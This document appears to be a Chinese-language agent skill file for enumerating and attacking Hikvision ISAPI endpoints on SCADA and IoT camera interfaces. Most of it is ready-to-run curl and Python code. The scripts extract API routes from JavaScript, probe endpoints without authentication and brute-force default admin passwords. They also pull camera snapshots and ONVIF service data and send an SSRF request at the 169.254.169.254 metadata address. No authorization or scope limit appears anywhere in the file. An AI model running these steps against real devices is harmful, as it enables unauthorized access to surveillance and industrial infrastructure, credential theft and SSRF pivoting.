---
name: scada-hikvision-isapi
description: 在 SCADA 与 IoT Web 界面上枚举海康威视 ISAPI 端点。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3
metadata:
  tags: [recon, SCADA, Hikvision, ISAPI, IoT, camera, RTSP, ONVIF, industrial]
  category: recon
  related_skills:
    - port-service-discovery
    - hunt-ssrf
    - iot-camera-recon
    - js-secrets-extraction
---

# SCADA 海康威视 ISAPI 枚举

在工业控制与视频监控 Web 界面上枚举海康威视 ISAPI（Intelligent Security Application Programming Interface，智能安全应用编程接口）端点。海康威视设备与 HikCentral Professional 部署会在可预测的路径上暴露丰富的 REST/XML API。尽管大多数端点需要认证（CAS 会话令牌、Basic 认证或 Digest 认证），未认证枚举仍可揭示设备类型、固件基线、可用模块以及潜在攻击面。JavaScript bundle 中通常包含完整的 ISAPI 路由树。

## When to Use

- 非标准端口（443、8443、9443）上的 Web 界面加载了大型 JavaScript bundle，其中引用了 `/ISAPI/`、`Bumblebee` 或 `Streaming/channels`。
- 端口扫描发现 RTSP（554）、ONVIF（8899）或海康威视专有端口（8000、9010）。
- 服务器响应头或 SSL 证书中提及 Hikvision、HikCentral、iVMS 或 Pyramid。
- 目标具有工业/能源/基础设施背景，很可能存在 SCADA 系统。
- Web 客户端从相对路径加载 `Common/common.js`、`Common/components.js` 或 `Common/vendorGraph.js`。

## Prerequisites

- 具备 curl、python3 与 nmap 的 `terminal`。
- 能够访问 Web 界面（即使未通过认证）。
- 目标提供 JavaScript bundle —— 下载它们以提取端点。

## How to Run

```bash
# Fingerprint the web interface
curl --max-time 30 --connect-timeout 10 -skI "https://TARGET:PORT/" | grep -iE "server|x-powered"

# Download the main JS bundle and scan for ISAPI endpoints
curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT/" | grep -Eo 'src="([^"]+\.js[^"]*)"' | while read -r match; do
  js_url=$(echo "$match" | grep -Eo '(\./[^"]+\.js[^"]*|/[^"]+\.js[^"]*)')
  [ -n "$js_url" ] && curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT$js_url" | grep -Po '/ISAPI/[^"'\''\s]{5,80}' | sort -u
done
```

## 快速检测

```bash
# Fingerprint the web interface
curl --max-time 30 --connect-timeout 10 -skI "https://TARGET:PORT/" | grep -iE "server|x-powered"

# Download the main JS bundle and scan for ISAPI endpoints
curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT/" | grep -Eo 'src="([^"]+\.js[^"]*)"' | while read -r match; do
  js_url=$(echo "$match" | grep -Eo '(\./[^"]+\.js[^"]*|/[^"]+\.js[^"]*)')
  [ -n "$js_url" ] && curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT$js_url" | grep -Po '/ISAPI/[^"'\''\s]{5,80}' | sort -u
done
```

## Procedure

### 阶段 1 — 从 JS Bundle 中提取端点

海康威视 Web 客户端将完整的 API 路由树嵌入 JavaScript 中：

```bash
# Download all JS files referenced in the main page
curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT/" | python3 -c "
import sys, re, requests, urllib3
urllib3.disable_warnings()

html = sys.stdin.read()
base = 'https://TARGET:PORT'

# Find all JS files
scripts = set(re.findall(r'(?:src|href)=\"([^\"]+\.js[^\"]*)\"', html))
for js in scripts:
    url = js if js.startswith('http') else f'{base}{js}' if js.startswith('/') else f'{base}/{js}'
    try:
        r = requests.get(url, verify=False, timeout=10)
        if r.status_code == 200:
            # Extract ISAPI paths
            paths = set(re.findall(r'/ISAPI/[A-Za-z0-9_/]+', r.text))
            if paths:
                print(f'\n{url} ({len(r.text)} bytes):')
                for p in sorted(paths)[:30]:
                    print(f'  {p}')
    except: pass
"
```

### 阶段 2 — 未认证端点探测

在不进行认证的情况下测试提取出的 ISAPI 路径：

```bash
ISAPI_PATHS=(
  "/ISAPI/Bumblebee/Platform/V0/KeepLive"
  "/ISAPI/Bumblebee/Platform/V0/CAS/SlaveSession"
  "/ISAPI/Bumblebee/Platform/V1/RecentlyVisitedMenu"
  "/ISAPI/Bumblebee/Platform/V1/SystemConfig/SceneConfig"
  "/ISAPI/Bumblebee/Platform/V0/LogicalResource/CameraElements/"
  "/ISAPI/Bumblebee/DeviceResource/V0/Servers/RecordServers/"
  "/ISAPI/Bumblebee/DeviceResource/V1/PhysicalResource/Devices/"
  "/ISAPI/Bumblebee/Platform/V1/Storage/LocalCloudStorageConfig"
  "/ISAPI/Bumblebee/Platform/V1/Permission/Security/UserPermission"
  "/ISAPI/Bumblebee/Platform/V0/RSM/Sites/"
  "/ISAPI/Streaming/channels/101/picture"
  "/ISAPI/ContentMgmt/StreamingProxy/channel/"
  "/ISAPI/ContentMgmt/download"
)

for path in "${ISAPI_PATHS[@]}"; do
  response=$(curl --max-time 30 --connect-timeout 10 -sk -w "\n%{http_code}" "https://TARGET:PORT$path" 2>/dev/null)
  code=$(echo "$response" | tail -1)
  body=$(echo "$response" | head -n -1)

  echo "=== $path ($code) ==="
  echo "$body" | head -5

  # Decode error codes
  if echo "$body" | grep -q "ErrorCode"; then
    error=$(echo "$body" | grep -Po 'ErrorCode\"?\s*[:\s]*(\d+)' | grep -Po '\d+')
    case $error in
      216) echo "  → SESSION_ERROR (auth required)";;
      401) echo "  → UNAUTHORIZED";;
      403) echo "  → FORBIDDEN";;
      404) echo "  → NOT_FOUND";;
      *)   echo "  → Code $error";;
    esac
  fi
done
```

### 阶段 3 — 身份认证测试

测试常见的凭据组合：

```bash
# XML-based CAS session login
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V0/CAS/SlaveSession" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<SessionLogin xmlns="http://www.isapi.org/ver20/XMLSchema" version="2.0">
  <userName>admin</userName>
  <password>PASSWORD</password>
  <sessionList><session><id>1</id></session></sessionList>
</SessionLogin>'

# JSON-based login
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V0/User/Login" \
  -H "Content-Type: application/json" \
  -d '{"userName":"admin","password":"PASSWORD"}'

# Test default passwords
for pw in admin 12345 123456 password admin123 Hikvision123 hikvision; do
  code=$(curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" \
    "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V0/KeepLive" \
    -u "admin:$pw")
  [ "$code" != "401" ] && echo "Basic auth: admin:$pw → $code"
done
```

### 阶段 4 — 流媒体与摄像头访问

若摄像头通道可访问：

```bash
# Try camera snapshots (channel 1-16)
for ch in 1 101 201 301; do
  curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT/ISAPI/Streaming/channels/$ch/picture" \
    -o "camera_$ch.jpg"
  [ -s "camera_$ch.jpg" ] && echo "Snapshot ch$ch: $(wc -c < camera_$ch.jpg) bytes"
done

# Check for RTSP streaming info
curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT/ISAPI/Streaming/channels/" | head -20

# ONVIF service discovery
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://TARGET:PORT/onvif/device_service" \
  -H "Content-Type: application/soap+xml" \
  -d '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
    <s:Body><GetServices xmlns="http://www.onvif.org/ver10/device/wsdl"/>
    </s:Body></s:Envelope>'
```

### 阶段 5 — 危险端点

优先关注以下可能实现 SSRF、数据访问或权限提升的端点：

```bash
# HTTP pass-through (potential SSRF)
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V1/DAM/HTTPPassThrough" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/"}'

# Cloud storage configuration exposure
curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V1/Storage/LocalCloudStorageConfig"

# User permission enumeration
curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V1/Permission/Security/UserPermission"

# Remote site management
curl --max-time 30 --connect-timeout 10 -sk "https://TARGET:PORT/ISAPI/Bumblebee/Platform/V0/RSM/Sites/"
```

## Pitfalls

- **ErrorCode 216 并非硬性阻断。** 它表示"需要会话"——端点存活但需要认证。这仍然是一个发现（暴露的服务）。
- **HikCentral 与独立设备的区别。** HikCentral Professional（Web 管理）使用 CAS/SlaveSession。独立 NVR/摄像头使用 Basic 或 Digest 认证。认证方式可以说明部署类型。
- **WebSocket 端点被隐藏。** JS 中引用了 `ws://127.0.0.1:` 用于本地 WebSocket 连接。外部 WebSocket 端点可能使用不同端口。
- **RTSP 通常基于 UDP。** 标准端口扫描会漏掉它。使用 `nmap -sU -p 554` 检测 UDP RTSP。
- **ONVIF 可能位于 80/8080 端口，而非 8899。** 使用 ONVIF SOAP 请求探测多个端口。

## Verification

1. 确认至少 5 个 ISAPI 端点有响应（即使返回 ErrorCode 216）。
2. 从 JavaScript bundle 中提取并记录完整的端点树。
3. 分别在携带与不携带 Basic 认证凭据的情况下测试每个端点。
4. 若有任一端点在未认证情况下返回数据，记录所暴露的信息。
5. 梳理攻击面：摄像头、流媒体、存储、权限、远程站点。

---

## 相关技能

- **`port-service-discovery`** —— 检测 Hikvision/RTSP/ONVIF 端口。
- **`hunt-ssrf`** —— 利用 HTTPPassThrough 代理实施 SSRF。
- **`iot-camera-recon`** —— 通用 IP 摄像头侦察模式。
- **`js-secrets-extraction`** —— 从可能用于 ISAPI 请求认证的 JS bundle 中提取 API 密钥与令牌。
